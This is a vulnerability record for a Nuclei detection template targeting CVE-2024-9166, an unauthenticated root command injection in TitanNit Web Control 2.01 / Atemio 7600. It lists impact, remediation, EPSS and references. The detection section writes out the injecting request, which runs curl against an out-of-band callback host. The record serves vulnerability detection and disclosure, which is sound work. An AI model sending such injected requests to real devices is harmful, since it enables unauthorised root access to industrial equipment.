---
cve_id: CVE-2024-9166
template_path: nuclei-templates/http/cves/2024/CVE-2024-9166.yaml
affected_product: TitanNit Web Control 2.01/Atemio 7600
severity: critical
authentication: none
external_callback: true
affected_versions: 2.01 (TitanNit Web Control) / Atemio 7600
preconditions: []
poc_classification: rce
---

## Vulnerability

TitanNit Web Control 2.01/Atemio 7600 is affected by CVE-2024-9166 (CWE-78), an OS command injection in the `getcommand` query parameter of the `/query` endpoint. Unauthenticated attackers can execute arbitrary system commands with root privileges by sending crafted requests containing the `cmd` parameter.

**Impact**: Unauthenticated attackers can execute arbitrary system commands with root privileges through command injection in the getcommand query parameter, achieving complete control of the TitanNit Web Control device and potentially pivoting to connected industrial control systems.

**Remediation**: Apply security patches from TitanNit for Web Control 2.01 and Atemio 7600 to address the command injection vulnerability in the getcommand query parameter.

**EPSS**: 0.06088 (90.589th percentile)

## PoC / Detection
Classification: rce

The template detects the vulnerability by sending the raw request `GET /query?getcommand=&cmd=curl+http://{{interactsh-url}}` (with 20s timeout) to inject a command that forces an out-of-band HTTP callback. Confirmation occurs via matchers checking for an `http` interactsh_protocol interaction and the string `titan.css` in the response body (device fingerprint).

## References
- https://www.cisa.gov/news-events/ics-advisories/icsa-24-270-03
- https://www.exploit-db.com/exploits/51853
- https://github.com/Andrysqui/CVE-2024-9166
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5801.php
